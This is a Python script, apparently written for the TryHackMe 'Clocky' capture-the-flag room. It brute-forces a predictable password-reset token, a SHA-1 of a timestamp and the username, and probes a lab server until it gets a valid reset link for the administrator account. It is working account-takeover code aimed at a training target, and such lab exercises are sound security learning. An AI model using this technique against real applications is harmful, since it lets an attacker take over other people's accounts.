# script with help from ChatGPT
# help to get token for password reset for the room Clocky on TryHackMe https://tryhackme.com/r/room/clocky
# token is generating as:
# value = datetime.datetime.now()
# lnk = str(value)[:-4] + " . " + username.upper()
# lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
import datetime
import hashlib
import requests

# Given details
given_time_str = "2024-03-31 17:23:00"
username = "administrator"
base_url = "http://10.10.61.254:8080/password_reset?token="

# Parse the given time string into a datetime object, without considering milliseconds for now
given_time = datetime.datetime.strptime(given_time_str, "%Y-%m-%d %H:%M:%S")

# Iterate over all possible "millisecond" values from "00" to "99"
for ms in range(100):
    # Format the "milliseconds" as a two-digit string
    ms_str = f"{ms:02}"
    # Create the datetime string including the simulated "milliseconds"
    time_with_ms = given_time.strftime("%Y-%m-%d %H:%M:%S.") + ms_str
    # Construct the string for hashing
    lnk = time_with_ms + " . " + username.upper()
    # Compute the SHA-1 hash of the constructed string
    token = hashlib.sha1(lnk.encode("utf-8")).hexdigest()

    # Make the HTTP request with the token
    response = requests.get(base_url + token, verify=False)  # Note: SSL verification is disabled

    # Check if the response is different from "<h2>Invalid token</h2>"
    if "<h2>Invalid token</h2>" not in response.text:
        # Print the token and the response only if it's valid
        print(f"Valid Token Found: {token}")
        print(f"Response: {response.text}\n")
        break  # Stop the loop after finding a valid token
